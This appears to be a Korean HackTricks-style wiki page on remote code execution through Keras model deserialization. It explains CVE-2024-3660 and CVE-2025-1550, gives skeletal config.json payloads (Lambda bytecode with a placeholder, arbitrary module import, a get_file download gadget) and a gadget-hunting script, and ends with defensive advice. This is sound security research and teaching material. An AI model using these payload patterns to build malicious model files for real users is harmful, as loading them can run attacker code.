# Keras 모델 역직렬화 RCE 및 가젯 헌팅

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 Keras 모델 역직렬화 파이프라인에 대한 실용적인 공격 기법을 요약하고, 네이티브 .keras 형식의 내부 구조와 공격 표면을 설명하며, 모델 파일 취약점(MFV) 및 수정 후 가젯을 찾기 위한 연구자 도구 키트를 제공합니다.

## .keras 모델 형식 내부 구조

.keras 파일은 최소한 다음을 포함하는 ZIP 아카이브입니다:
- metadata.json – 일반 정보 (예: Keras 버전)
- config.json – 모델 아키텍처 (주요 공격 표면)
- model.weights.h5 – HDF5 형식의 가중치

config.json은 재귀적 역직렬화를 주도합니다: Keras는 모듈을 가져오고, 클래스/함수를 해결하며, 공격자가 제어하는 사전에서 레이어/객체를 재구성합니다.

Dense 레이어 객체에 대한 예제 코드 조각:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- 모듈 가져오기 및 모듈/class_name 키에서 기호 해석
- 공격자가 제어하는 kwargs로 from_config(...) 또는 생성자 호출
- 중첩 객체(활성화, 초기화기, 제약 조건 등)로의 재귀

역사적으로, 이는 config.json을 작성하는 공격자에게 세 가지 원시 기능을 노출했습니다:
- 어떤 모듈이 가져오는지 제어
- 어떤 클래스/함수가 해석되는지 제어
- 생성자/from_config에 전달되는 kwargs 제어

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config()는 python_utils.func_load(...)를 사용하여 공격자 바이트에 대해 base64 디코딩하고 marshal.loads()를 호출합니다; Python 언마샬링은 코드를 실행할 수 있습니다.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras는 기본적으로 safe_mode=True를 적용합니다. 사용자가 명시적으로 safe_mode=False로 설정하지 않는 한 Lambda에서 직렬화된 Python 함수는 차단됩니다.

Notes:
- 레거시 형식(구형 HDF5 저장) 또는 구형 코드베이스는 현대적인 검사를 적용하지 않을 수 있으므로, 피해자가 구형 로더를 사용할 때 "다운그레이드" 스타일 공격이 여전히 적용될 수 있습니다.

## CVE-2025-1550 – Keras ≤ 3.8에서 임의 모듈 가져오기

Root cause:
- _retrieve_class_or_fn은 config.json에서 공격자가 제어하는 모듈 문자열을 사용하여 제한 없는 importlib.import_module()를 사용했습니다.
- Impact: 설치된 모듈(또는 sys.path에 있는 공격자가 심은 모듈)의 임의 가져오기. 가져오기 시 코드가 실행되고, 그 후 공격자 kwargs로 객체가 생성됩니다.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
보안 개선 사항 (Keras ≥ 3.9):
- 모듈 허용 목록: 공식 생태계 모듈로 제한된 가져오기: keras, keras_hub, keras_cv, keras_nlp
- 안전 모드 기본값: safe_mode=True는 안전하지 않은 Lambda 직렬화 함수 로딩을 차단합니다.
- 기본 유형 검사: 역직렬화된 객체는 예상 유형과 일치해야 합니다.

## 허용 목록 내의 포스트 수정 가젯 표면

허용 목록과 안전 모드가 있더라도, 허용된 Keras 호출 가능 항목 사이에 넓은 표면이 남아 있습니다. 예를 들어, keras.utils.get_file은 임의의 URL을 사용자 선택 위치로 다운로드할 수 있습니다.

허용된 함수를 참조하는 Lambda를 통한 가젯 (직렬화되지 않은 Python 바이트코드):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
중요한 제한 사항:
- Lambda.call()은 대상 호출 가능 항목을 호출할 때 입력 텐서를 첫 번째 위치 인수로 추가합니다. 선택된 가젯은 추가 위치 인수를 허용해야 하며 (*args/**kwargs를 수용해야 함) 이는 어떤 함수가 유효한지를 제한합니다.

허용된 가젯의 잠재적 영향:
- 임의 다운로드/쓰기 (경로 심기, 구성 오염)
- 환경에 따라 네트워크 콜백/SSRF 유사 효과
- 작성된 경로가 나중에 가져오거나 실행되거나 PYTHONPATH에 추가되거나, 쓰기 가능한 실행-쓰기 위치가 존재하는 경우 코드 실행으로 연결될 수 있음

## 연구자 도구 키트

1) 허용된 모듈에서 체계적인 가젯 발견

keras, keras_nlp, keras_cv, keras_hub 전반에 걸쳐 후보 호출 가능 항목을 나열하고 파일/네트워크/프로세스/환경 부작용이 있는 항목을 우선시합니다.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) 직접 역직렬화 테스트 (.keras 아카이브 필요 없음)

제작된 dict를 Keras 역직렬화기에 직접 입력하여 허용된 매개변수를 학습하고 부작용을 관찰합니다.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) 크로스 버전 프로빙 및 포맷

Keras는 다양한 가드레일과 포맷을 가진 여러 코드베이스/시대에 존재합니다:
- TensorFlow 내장 Keras: tensorflow/python/keras (레거시, 삭제 예정)
- tf-keras: 별도로 유지 관리
- 멀티 백엔드 Keras 3 (공식): 네이티브 .keras 도입

코드베이스와 포맷(.keras vs 레거시 HDF5) 전반에 걸쳐 테스트를 반복하여 회귀 또는 누락된 가드를 발견합니다.

## 방어적 권장 사항

- 모델 파일을 신뢰할 수 없는 입력으로 취급합니다. 신뢰할 수 있는 출처에서만 모델을 로드합니다.
- Keras를 최신 상태로 유지합니다; allowlisting 및 타입 검사를 활용하기 위해 Keras ≥ 3.9를 사용합니다.
- 파일을 완전히 신뢰하지 않는 한 모델을 로드할 때 safe_mode=False로 설정하지 마십시오.
- 네트워크 이탈이 없고 파일 시스템 접근이 제한된 샌드박스화된 최소 권한 환경에서 역직렬화를 실행하는 것을 고려하십시오.
- 가능한 경우 모델 출처 및 무결성 검사를 위한 allowlist/서명을 시행합니다.

## 참고 문헌

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
